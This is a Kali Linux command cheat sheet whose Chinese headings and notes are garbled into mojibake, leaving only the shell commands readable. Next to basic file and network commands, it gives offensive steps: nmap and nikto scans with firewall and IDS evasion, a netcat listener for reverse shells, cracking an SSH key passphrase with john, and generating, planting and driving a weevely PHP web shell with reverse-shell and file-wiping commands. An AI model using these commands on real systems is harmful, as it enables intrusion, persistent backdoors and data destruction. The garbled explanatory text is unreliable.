# Kali LinuxæŒ‡ä»¤

- **æ‰“å°**
    - æ‰“å°å­—ç¬¦ä¸²
        
        ```bash
        echo Hello
        ```
        
        - ç›¸å…³æŠ€å·§
            - æ‰“å°ä»¥Base64ç¼–ç 
                
                ```bash
                echo Hello | base64
                ```
                
    - å°†å·¦ä¾§æ ‡å‡†è¾“å‡ºä½œä¸ºå³ä¾§æ ‡å‡†è¾“å…¥
        
        ```bash
        a|b
        ```
        
    - å°†å·¦ä¾§æ ‡å‡†è¾“å‡ºå†™å…¥åˆ°æ–‡ä»¶
        
        ```bash
        a>[file_name]
        ```
        
        - ç›¸å…³æŠ€å·§
            - é‡å®šå‘æ ‡å‡†è¾“å‡ºçš„åºå·
                
                ```bash
                0>[file_name]
                ```
                
            - å¿½ç•¥è¯­å¥çš„ï¼ˆæŠ¥é”™ï¼‰è¾“å‡º
                
                ```bash
                2>/dev/null
                ```
                
    - å°†å·¦ä¾§æ ‡å‡†è¾“å‡ºè¿½åŠ åˆ°æ–‡ä»¶
        
        ```bash
        b>>[file_name]
        ```
        
- **æ–‡ä»¶ç®¡ç†**
    - æ‰“å°å½“å‰çš„å·¥ä½œç›®å½•
        
        ```bash
        pwd
        ```
        
    - åˆ—å‡ºç‰¹å®šè·¯å¾„ä¸­çš„ç›®å½•
        
        ```bash
        ls [path_name]
        ```
        
        - ç›¸å…³æŠ€å·§
            - åˆ—å‡ºç›®å½•ä¸­æ‰€æœ‰æ–‡ä»¶ï¼ˆæƒé™ä¸éšè—æ–‡ä»¶ï¼‰
                
                ```bash
                ls -al [path_name]
                ```
                
            - åˆ—å‡ºå­ç›®å½•çš„æ–‡ä»¶
                
                ```bash
                ls -R [path_name]
                ```
                
    - è¿›å…¥æŒ‡å®šç›®å½•
        
        ```bash
        cd [path_name]
        ```
        
        - ç›¸å…³æŠ€å·§
            - è¿›å…¥æ ¹ç›®å½•
                
                ```bash
                cd /root
                ```
                
            - è¿›å…¥ç¼“å­˜ç›®å½•ï¼ˆæ£€æŸ¥æ®‹ç•™æ–‡ä»¶ï¼‰
                
                ```bash
                cd /tmp
                ```
                
    - ç§»åŠ¨æ–‡ä»¶ã€é‡å‘½åæ–‡ä»¶
        
        ```bash
        mv [file_name] [path_name]
        ```
        
        ```bash
        mv [org_name] [new_name]
        ```
        
    - æŸ¥æ‰¾æ–‡ä»¶ï¼ˆå¸¦æœ‰æ¡ä»¶ï¼‰
        - æŒ‡å®šç›®å½•å¼€å§‹ï¼Œé€’å½’æŸ¥è¯¢å…·æœ‰å®Œå…¨æƒé™çš„æ–‡ä»¶
            
            ```bash
            find [path_name] -perm -4000
            ```
            
        - æ•´æœºæŸ¥è¯¢å…·æœ‰å®Œå…¨æƒé™çš„æ–‡ä»¶
            
            ```bash
            find / -perm -4000 2>/dev/null
            ```
            
        - æŸ¥çœ‹éš¶å±äºæŸç”¨æˆ·çš„æ–‡ä»¶
            
            ```bash
            find / -user [user_name]
            ```
            
    - ä¿®æ”¹æ–‡ä»¶æƒé™
        - å°†æ–‡ä»¶è®¾ä¸ºä»»ä½•äººå®Œå…¨æƒé™
            
            ```bash
            chmod 777 [file_name]
            ```
            
        - åªæœ‰æ‹¥æœ‰è€…å®Œå…¨æƒé™
            
            ```bash
            chmod u=7,g=0,o=0 [file_name]
            ```
            
        - åŒç»„æˆå‘˜æ·»åŠ å¯æ‰§è¡Œæƒé™
            
            ```bash
            chmod g+x
            ```
            
        - ç›¸å…³ç»†èŠ‚
            1. ç”¨æˆ·æƒé™
                
                
                | å­—ç¬¦è¡¨ç¤º | ç”¨æˆ·æƒé™ |
                | --- | --- |
                | u | æ–‡ä»¶æ‰€æœ‰è€… |
                | g | ä¸æ–‡ä»¶æ‰€æœ‰è€…åŒçº§ |
                | o | é™¤æ–‡ä»¶æ‰€æœ‰è€…å¤– |
                | a | ä»»ä½•äºº |
            2. æƒé™ä¿®æ”¹
                
                
                | å­—ç¬¦è¡¨ç¤º | ä¿®æ”¹æ•ˆæœ |
                | --- | --- |
                | + | å¢åŠ æƒé™ |
                | - | æ’¤é”€æƒé™ |
                | = | è®¾å®šæƒé™ |
            3. æ•°å­—ç¼©å†™
                
                
                | rwx | rw- | r-- | r-x | -wx | -w- | --x | --- |
                | --- | --- | --- | --- | --- | --- | --- | --- |
                | 7 | 6 | 5 | 4 | 3 | 2 | 1 | 0 |
    - åˆ é™¤æ–‡ä»¶
        
        ```bash
        rm [file_name]
        ```
        
        - ç›¸å…³æŠ€å·§
            - ç¡®è®¤æç¤ºåˆ é™¤æ–‡ä»¶
                
                ```bash
                rm -i [file_name]
                ```
                
            - é€’å½’å¼ºåˆ¶åˆ é™¤æ–‡ä»¶
                
                ```bash
                rm -rf [file_name]
                ```
                
    - åˆ›å»ºç›®å½•
        
        ```bash
        mkdir [dir_name]
        ```
        
    - åˆ›å»ºæ–‡ä»¶
        
        ```bash
        touch [file_name]
        ```
        
    - æ‰“å°æ–‡ä»¶å†…å®¹
        
        ```bash
        cat [file_name]
        ```
        
        - ç›¸å…³æŠ€å·§
            - æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·åˆ—è¡¨
                
                ```bash
                cat /etc/passwd
                ```
                
            - æŸ¥çœ‹ç”¨æˆ·ç»„
                
                ```bash
                cat /etc/group
                ```
                
    - æŸ¥çœ‹å‹ç¼©åŒ…å†…æ–‡ä»¶
        
        ```bash
        zcat [zip_name]
        ```
        
    - æ‰“å°æ–‡ä»¶ä¸­çš„ï¼ˆå¯æ‰“å°ï¼‰å­—ç¬¦ä¸²
        
        ```bash
        strings [file_name]
        ```
        
- **æ–‡ä»¶ç¼–è¾‘**
    - å‘½ä»¤è¡Œæ–‡æœ¬ç¼–è¾‘å™¨
        
        ```bash
        vim [file_name]
        ```
        
        - æ’å…¥æ¨¡å¼ï¼š`a` æˆ–è€… `i`
        - è¿”å›æ™®é€šæ¨¡å¼ï¼š`[Esc]`
        - æ–°å»ºç©ºè¡Œï¼Œå¹¶å®šä½å…‰æ ‡ï¼š`:o`
        - ä¿å­˜ä¸”é€€å‡ºï¼š`:wq`
        - ä¸ä¿å­˜å¼ºåˆ¶é€€å‡ºï¼š`:q!`
        - é€€å‡ºï¼š`:quit`
        - é€€å‡ºï¼š`[Shift]` + `zz`
- **ç³»ç»Ÿç›¸å…³**
    1. æˆäºˆç”¨æˆ·ç®¡ç†å‘˜æƒé™
        
        ```bash
        su
        ```
        
    2. ä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œå‘½ä»¤
        
        ```bash
        sudo [command]
        ```
        
        - ç›¸å…³æŠ€å·§
            1. æŸ¥è¯¢å…·æœ‰ç®¡ç†å‘˜æƒé™çš„å‘½ä»¤
                
                ```bash
                sudo -l
                ```
                
    3. æŸ¥çœ‹å½“å‰æ‰€åœ¨ç”¨æˆ·ç»„
        
        ```bash
        whoami
        ```
        
    4. æŸ¥çœ‹å½“å‰ç”¨æˆ·ä¿¡æ¯
        
        ```bash
        id
        ```
        
    5. æŸ¥çœ‹æŒ‡ä»¤æ‰€åœ¨ä½ç½®
        
        ```bash
        whereis [command]
        ```
        
- **æ‚é¡¹**
    1. æŸ¥çœ‹å‘½ä»¤æç¤º
        
        ```bash
        man [command]
        ```
        
- **ç½‘ç»œ**
    - ä¸‹è½½æ–‡ä»¶åˆ°å½“å‰ç›®å½•
        
        ```bash
        wget [http://ip:port]
        ```
        
    - å°è¯•è®¿é—®ç½‘é¡µï¼Œè·å–è¯·æ±‚å¤´ä¸å“åº”
        
        ```bash
        curl -v [http://ip:port]
        ```
        
    - æ‰“å°æœ¬æœºç½‘ç»œåœ°å€
        
        ```bash
        ifconfig #å…¶ä¸­ï¼šinetä¸ºæœ¬åœ°ç½‘å¡
        ```
        
    - æ£€æŸ¥ç½‘ç»œåœ°å€å¯è®¿é—®æ€§
        
        ```bash
        ping [http://ip:port]
        ```
        
    - æ‰«æå±€åŸŸç½‘å†…æ‰€æœ‰ç”¨æˆ·åœ°å€
        
        ```bash
        arp-scan -l
        ```
        
        ```
        netdiscover -r [current_ip]/24
        ```
        
    - æ‰«æç«¯å£
        - é€šè¿‡ç‰ˆæœ¬æ‰«ææ¢æµ‹ç«¯å£
            
            ```bash
            nmap -sV [target_ip]
            ```
            
        - è·³è¿‡ä¸»æœºå‘ç°ï¼Œè¿›è¡Œç«¯å£æ‰«æ
            
            ```bash
            nmap -Pn [target_ip]
            ```
            
        - å…¨é¢æ‰«æç«¯å£
            
            ```bash
            nmap -A -v [target_ip]
            ```
            
        - æ¢æµ‹æ“ä½œç³»ç»Ÿç±»å‹ï¼Œå†…æ ¸ç‰ˆæœ¬
            
            ```bash
            nmap -O [target_ip]
            ```
            
        - pingæ‰«æ
            
            ```bash
            nmap -sP [target_ip]
            ```
            
        - æ— pingæ‰«æ
            
            <aside>
            ğŸ’¡ é¿å…é˜²ç«å¢™å‘ç°pingè¡Œä¸º
            
            </aside>
            
            ```bash
            nmap -p0 [target_ip]
            ```
            
    - æ¢æµ‹æœåŠ¡éšè—æ–‡ä»¶ï¼Œæ•æ„Ÿæ–‡ä»¶
        
        ```bash
        dirb [http://ip:port]
        ```
        
    - æ¢æµ‹æœåŠ¡é‡ç‚¹æ–‡ä»¶
        
        ```bash
        nikto -host [ip]
        ```
        
        - ç›¸å…³æŠ€å·§
            - æŒ‰ç«¯å£æ‰«æ
                
                ```bash
                nikto -host [ip] -p
                ```
                
            - ç»•è¿‡IDSå…¥ä¾µæ£€æµ‹
                
                <aside>
                ğŸ’¡ åæ¥å¯é€‰æ¨¡å¼åºå·
                
                </aside>
                
                ```bash
                nikto -host [ip] -evasion 12345678
                ```
                
            - é…åˆnmapæ‰«æ
                
                ```bash
                nmap -p[port] [ip] -oG - | nikto -host-
                ```
                
    - netcatç«¯å£ç›‘å¬
        
        <aside>
        ğŸ’¡ é…åˆåå¼¹Shell
        
        </aside>
        
        ```bash
        nc -lvnp [free_port]
        ```
        
    - netcatå»ºç«‹ç®€å•å“åº”
        
        ```bash
        nc -lk [port] -c "echo -e 'HTTP/1.1 200 OK'"
        ```
        
    - æŸ¥çœ‹å·²å ç”¨ç«¯å£
        
        ```bash
        netstat -pantu
        ```
        
- **SSHåè®®ç™»å½•**
    - é€šè¿‡SSHåœ¨å®¢æˆ·ç«¯è¿œç¨‹ç™»å½•æœåŠ¡å™¨
        
        ```bash
        ssh [user_name]@[ip]
        ```
        
        1. ä½¿ç”¨ç§é’¥è¿œç¨‹ç™»å½•æœåŠ¡å™¨
            
            <aside>
            ğŸ’¡ ç§é’¥åä¸ºid_rsa
            
            </aside>
            
            ```bash
            ssh -i id_rsa [user_name]@[ip]
            ```
            
            - ç›¸å…³æŠ€å·§
                - æå‡æœ¬åœ°ç§é’¥æ–‡ä»¶æƒé™ï¼ˆå¦‚éœ€ï¼‰
                    
                    ```bash
                    chmod 600 id_rsa
                    ```
                    
    - å®¢æˆ·ç«¯ç”Ÿæˆå…¬é’¥ã€ç§é’¥å¯¹
        
        ```bash
        ssh-keygen
        ```
        
    - æ‹·è´å…¬é’¥
        
        ```bash
        ssh-copy-id -i [key_address] [user_name]@[ip]
        ```
        
        - ç›¸å…³æŠ€å·§
            - æœåŠ¡ç«¯å…¬é’¥åœ°å€ä¸€èˆ¬ä¸ºï¼š`/root/.ssh/id_rsa.pub`
            - æœ¬åœ°ç§é’¥åœ°å€ä¸€èˆ¬ä¸ºï¼š`/root/.ssh/id_rsa`
            - æ”»å‡»æ—¶ï¼Œå°è¯•è·å–ç§é’¥ä¸ç™»å½•ç”¨æˆ·å
            - è®¤è¯å…³é”®å­—æ–‡ä»¶ä¸€èˆ¬åŒæ ·åœ¨`.ssh/`å†…ï¼Œä¿å­˜äº†æ•°ä¸ªå…¬é’¥æ–‡ä»¶ï¼Œå…¶å†…å®¹ä¸€èˆ¬ä¸å…¬é’¥ç›¸åŒ
                - æ–‡ä»¶åå¯èƒ½ä¸º`authorized_keys`
                - æ­¤æ–‡ä»¶ä¸­ï¼Œå¯èƒ½æ‰¾åˆ°ç™»å½•çš„ç”¨æˆ·å
            - å…¬é’¥ä¸Šä¼ åˆ°æœåŠ¡ç«¯ä¹‹åï¼Œæœ¬åœ°ç™»å½•ï¼ˆæœ¬åœ°ç§é’¥å…·å¤‡è¯»å†™æƒé™ï¼‰
                
                ```bash
                ssh [ip]
                ```
                
    - å®‰å…¨å¤åˆ¶æ–‡ä»¶è‡³æœ¬åœ°ï¼ˆSSHåè®®ï¼‰
        
        ```bash
        scp -p -P[port] [local_file] [user_name]@[ip]:[remote_file]
        ```
        
        - ç›¸å…³æŠ€å·§
            - å¤åˆ¶ç›®å½•è‡³æœ¬åœ°
                
                ```bash
                scp -r -P[port] [local_file] [user_name]@[ip]:[remote_file]
                ```
                
    - åœ¨æœåŠ¡ç«¯ä¸Šä¼ ä¸‹è½½æ–‡ä»¶
        - é“¾æ¥æœåŠ¡ç«¯æ–‡ä»¶è·¯å¾„
            
            ```bash
            sftp [user_name]@[ip]:[remote_dir]
            ```
            
        - ä¸Šä¼ æ–‡ä»¶åˆ°è¯¥è·¯å¾„
            
            ```bash
            put [file_name] [remote_dir]
            ```
            
        - ä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ°è·¯å¾„
            
            ```bash
            get [remote_file] [local_dir]
            ```
            
    - çˆ†ç ´RSAç§é’¥æ–‡ä»¶çš„è®¿é—®å¯†ç 
        - å°†ç§é’¥æ–‡ä»¶è½¬åŒ–ä¸ºjohnå¯è¯†åˆ«å†…å®¹
            
            ```bash
            ssh2john id_rsa>[file_name]
            ```
            
        - johnçˆ†ç ´è½¬åŒ–åç§é’¥æ–‡ä»¶ï¼Œè·å–è®¿é—®ç§é’¥å¯†ç 
            
            ```bash
            zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules [file_name]
            ```
            
- **æ¼æ´**
    - ä¸­å›½èœåˆ€ï¼ŒWeb Shellæ¼æ´
        - è®¾å®šæœ¬åœ°ç™»å½•å¯†ç ï¼Œç”Ÿæˆåé—¨æ–‡ä»¶ï¼Œå­˜å‚¨æœ¬åœ°è·¯å¾„
            
            <aside>
            ğŸ’¡ åé—¨æ–‡ä»¶ä»¥`.php`ç»“å°¾
            
            </aside>
            
            <aside>
            ğŸ’¡ æœåŠ¡å™¨å¼€å¯Htaccessåï¼Œåé—¨æ–‡ä»¶å¯ä»¥ `.img` `.htaccess`ç»“å°¾
            
            </aside>
            
            ```bash
            weevely generate [password] [local_path]
            ```
            
        - è¿œç¨‹æ§åˆ¶ Web Shell
            
            ```bash
            weevely [http://ip:port/backdoor_name.php] [password]
            ```
            
            - ç›¸å…³æŠ€å·§
                1. æ­¤å‰ï¼Œé€šè¿‡æ–¹æ³•å°†ç”Ÿæˆçš„æœ¨é©¬æ”¾å…¥æœåŠ¡å™¨ï¼Œä¸€èˆ¬æ”¾åœ¨ç½‘ç«™æ ¹ç›®å½• `/var/www/html/backdoor.php`ï¼Œå…¶ä½™ç›®å½•éœ€å¯¹åº”æ›´æ”¹URL
            - å¸¸ç”¨å‘½ä»¤
                
                <aside>
                ğŸ’¡ åªåœ¨æ¸—é€åå¯ç”¨
                
                </aside>
                
                1. æ‰“å¼€è™šæ‹Ÿç»ˆç«¯ï¼š`:shell.sh`
                2. è·å–ç³»ç»ŸåŸºæœ¬ä¿¡æ¯ï¼š`:system.info`
                3. æŸ¥çœ‹phpé…ç½®ä¿¡æ¯ï¼š`:audit.phpconf`
                4. å»ºç«‹åå¼¹shellåˆ°ç«¯å£ï¼š`:backdoor.reverstcp [host_ip] [port]`
                5. åˆ é™¤æ–‡ä»¶ï¼š`:file.rm [filename]`
                6. å¹²æ‰æœåŠ¡å™¨ï¼š`:file.rm [filename] -recursive`
    - æŠ“åŒ…å·¥å…·
        - Burp Suiteï¼š[åˆ©ç”¨æœ¨é©¬è¿œç¨‹æ§åˆ¶æœåŠ¡å™¨](https://www.cnblogs.com/cainiao-chuanqi/p/14352805.html)
        - WireSharkï¼š[WireSharkä¸Šæ‰‹æ•™ç¨‹](https://www.cnblogs.com/mq0036/p/11187138.html)
- **å¥‡æŠ€æ·«å·§**
    - ä¸€å¥è¯è¿æ¥ä¸¤ä¸ªå‘½ä»¤çš„æ–¹æ³•
        
        ```bash
        ping [ip] ; echo Hello
        ```
        
        <aside>
        ğŸ’¡ ç¬¬ä¸€ä¸ªæ‰§è¡ŒæˆåŠŸä¹‹åï¼Œæ‰§è¡Œç¬¬äºŒä¸ª
        
        </aside>
        
        ```bash
        ping [ip] && echo Hello
        ```
        
        <aside>
        ğŸ’¡ ç¬¬ä¸€ä¸ªæ‰§è¡Œå¤±è´¥ä¹‹åï¼Œæ‰§è¡Œç¬¬äºŒä¸ª
        
        </aside>
        
        ```bash
        ping [ip] || echo Hello
        ```